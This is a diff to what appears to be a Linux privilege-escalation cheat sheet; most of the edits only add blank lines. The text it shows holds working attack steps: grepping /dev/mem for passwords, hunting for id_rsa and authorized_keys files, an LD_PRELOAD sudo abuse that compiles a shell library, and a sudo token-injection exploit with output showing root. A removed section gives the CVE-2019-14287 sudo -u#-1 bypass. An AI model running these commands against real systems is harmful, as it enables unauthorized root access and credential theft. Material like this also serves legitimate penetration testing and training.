@@ -63,11 +63,16 @@ find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
 strings /dev/mem -n10 | grep -i PASS
 
 # Find sensitive files
-$ locate password | more           
+$ locate password | more    
+
 /boot/grub/i386-pc/password.mod
+
 /etc/pam.d/common-password
+
 /etc/pam.d/gdm-password
+
 /etc/pam.d/gdm-password.original
+
 /lib/live/config/0031-root-password
 
 # SSH Key
@@ -75,6 +80,7 @@ $ locate password | more
 *Sensitive files*
 
 find / -name authorized_keys 2> /dev/null
+
 find / -name id_rsa 2> /dev/null
 
 
@@ -88,6 +94,7 @@ $ sudo -l
 If LD_PRELOAD is explicitly defined in the sudoers file
 
 Defaults        env_keep += LD_PRELOAD
+
 Compile the shared C code below on victim machine with gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 
 #include <stdio.h>
@@ -106,7 +113,9 @@ Execute any binary with the LD_PRELOAD to spawn a shell : sudo LD_PRELOAD=<full_
 Using https://github.com/nongiach/sudo_inject
 
 $ sudo whatever
+
 [sudo] password for user:    
+
 # Press <ctrl>+c since you don't have the password. 
 # This creates an invalid sudo tokens.
 $ sh exploit.sh
@@ -114,12 +123,5 @@ $ sh exploit.sh
 $ sudo -i # no password required :)
 # id
 uid=0(root) gid=0(root) groups=0(root)
+	
 Slides of the presentation : https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf
-
-CVE-2019-14287
-# Exploitable when a user have the following permissions (sudo -l)
-(ALL, !root) ALL
-
-# If you have a full TTY, you can exploit it like this
-sudo -u#-1 /bin/bash
-sudo -u#4294967295 id
